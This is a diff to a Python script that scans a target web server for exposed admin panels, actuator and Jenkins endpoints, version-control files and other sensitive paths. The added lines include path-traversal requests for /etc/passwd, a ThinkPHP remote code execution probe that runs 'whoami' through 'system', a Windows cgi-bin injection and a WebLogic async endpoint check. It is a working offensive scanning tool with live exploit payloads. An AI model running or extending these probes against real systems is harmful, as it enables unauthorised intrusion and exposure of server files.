@@ -6,7 +6,49 @@ import requests
 
 
 def scan(url):
-    mulu= ['/dump','/trace','/logfile','/env','/actuator/','/jolokia/list','/robots.txt', '/.htaccess', '/admin', '/WEB-INF/web.xml', '/.svn/entries', '/cms', '/FCKeditor', '/fck', '/console/login/LoginForm.jsp', '/jenkins/','/%c0%ae/WEB-INF/web.xml', '/em/', '/isqlplus/', '/ws_utc/config.do', '/ws_utc/begin.do', '/jmx-console/', '/install/', '/uddiexplorer/SearchPublicRegistries.jsp', '/crossdomain.xml', '/WS_FTP.LOG', '/console/', '/fckeditor/editor/filemanager/connectors/test.html', '/.svn/all-wcprops', '/manage', '/script', '/_nodes', '/_river', '/_config', '/containers/json', '/index.jsp', '/index.html', '/Admin', '/Admin/login.jsp', '/Admin/Login.jsp', '/system', '/home','/wp-admin/includes/admin.php',
+    mulu= ['/dump',
+           '/trace',
+           '/logfile',
+           '/env',
+           '/actuator/',
+           '/jolokia/list',
+           '/robots.txt',
+           '/.htaccess',
+           '/admin',
+           '/WEB-INF/web.xml',
+           '/.svn/entries',
+           '/cms',
+           '/FCKeditor',
+           '/fck',
+           '/console/login/LoginForm.jsp',
+           '/jenkins/',
+           '/%c0%ae/WEB-INF/web.xml',
+           '/em/',
+           '/isqlplus/',
+           '/ws_utc/config.do',
+           '/ws_utc/begin.do',
+           '/jmx-console/',
+           '/install/',
+           '/uddiexplorer/SearchPublicRegistries.jsp',
+           '/crossdomain.xml',
+           '/WS_FTP.LOG',
+           '/console/',
+           '/fckeditor/editor/filemanager/connectors/test.html',
+           '/.svn/all-wcprops',
+           '/manage',
+           '/script',
+           '/_nodes',
+           '/_river',
+           '/_config',
+           '/containers/json',
+           '/index.jsp',
+           '/index.html',
+           '/Admin',
+           '/Admin/login.jsp',
+           '/Admin/Login.jsp',
+           '/system',
+           '/home',
+           '/wp-admin/includes/admin.php',
            '/wp-settings.php',
            '/phpinfo.php',
            '/admin.jsp',
@@ -26,8 +68,16 @@ def scan(url):
            '/web-console',
            '/zh-CN/app/Callat/home',
            '/webalizer',
-		   '/ws/services',
-		   '/ws/services/HelloServices?wsdl'
+           '/ws/services',
+           '/ws/services/HelloServices?wsdl',
+           '/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C',
+           '/foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd',
+           '/foo/default/master/../../../etc/passwd',
+           '/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
+           '/login?from=%2F',
+           '/jenkins',
+           '/_async/AsyncResponseService',
+           '/console/'
            ]
     header = {
             'Connection': 'keep-alive',
@@ -41,7 +91,7 @@ def scan(url):
             'Referer': 'http://'+url,
             'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
         }
-    print(1)
+    
     if 'http' in url:
         url2 = url
     else:
@@ -50,11 +100,8 @@ def scan(url):
     print(url2)
     for m in mulu:
 
-
         file = r"result.txt"
         with open(file, 'a+') as f:
-            print(3)
-
 
             try:
                 reponse2 = requests.get(url2+m, timeout=3, headers=header)
@@ -63,7 +110,7 @@ def scan(url):
                 code2 = reponse2.status_code
 
 
-                if 100< code2 < 305 or 400 < code2 < 403 or code2 > 499:
+                if 100< code2 < 305:
                     print(url2+m+'*************************'+'存活')
                     html = reponse2.text
 
